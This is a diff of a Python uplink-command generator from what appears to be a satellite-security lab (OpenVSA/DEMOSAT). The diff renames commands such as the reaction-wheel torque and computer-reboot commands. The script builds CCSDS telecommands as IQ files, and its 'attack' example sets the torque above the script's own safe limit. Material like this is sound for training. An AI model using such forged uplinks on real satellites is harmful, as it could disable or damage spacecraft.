@@ -6,9 +6,9 @@ Thin wrapper over the canonical codec (attacker/openvsa/satellites/demosat/ccsds
 Builds an OOK-modulated cf32 IQ file that OpenVSA's decoder.py can decode.
 
 Examples:
-    python3 generate.py adcs_torque --torque 999 -o attack.cf32   # ★ main scenario
+    python3 generate.py spin_control --torque 999 -o attack.cf32  # ★ main scenario
     python3 generate.py solar_panel --angle 0    -o attack.cf32
-    python3 generate.py obc_reboot               -o attack.cf32
+    python3 generate.py computer_reboot          -o attack.cf32
 """
 import os
 import sys
@@ -28,12 +28,12 @@ def main():
     ap = argparse.ArgumentParser(description="DEMOSAT uplink command generator (CCSDS TC over OOK)")
     ap.add_argument("command", choices=commands, help="command name")
     ap.add_argument("-o", "--out", default="attack.cf32", help="output cf32 path")
-    ap.add_argument("--torque", type=int, help="adcs_torque: reaction-wheel torque (mNm, int16)")
+    ap.add_argument("--torque", type=int, help="spin_control: reaction-wheel torque (mNm, int16)")
     ap.add_argument("--angle", type=int, help="solar_panel: panel angle (0-255)")
-    ap.add_argument("--az", type=int, help="antenna_gimbal: azimuth")
-    ap.add_argument("--el", type=int, help="antenna_gimbal: elevation")
-    ap.add_argument("--bitmask", type=int, help="subsystem_ctrl: bitmask")
-    ap.add_argument("--on", action="store_true", help="transponder_ctrl: turn on")
+    ap.add_argument("--az", type=int, help="antenna_point: azimuth")
+    ap.add_argument("--el", type=int, help="antenna_point: elevation")
+    ap.add_argument("--bitmask", type=int, help="system_toggle: bitmask")
+    ap.add_argument("--on", action="store_true", help="radio_switch: turn on")
     ap.add_argument("--raw", help="generic hex payload")
     ap.add_argument("--seq", type=int, default=0, help="frame/packet sequence number")
     args = ap.parse_args()
@@ -46,7 +46,7 @@ def main():
 
     # safe-torque advisory for the main scenario
     warn = ""
-    if args.command == "adcs_torque":
+    if args.command == "spin_control":
         meta = proto["opcodes"]["0x21"]
         limit = meta.get("safeAbsMax", 500)
         if args.torque is not None and abs(args.torque) > limit:
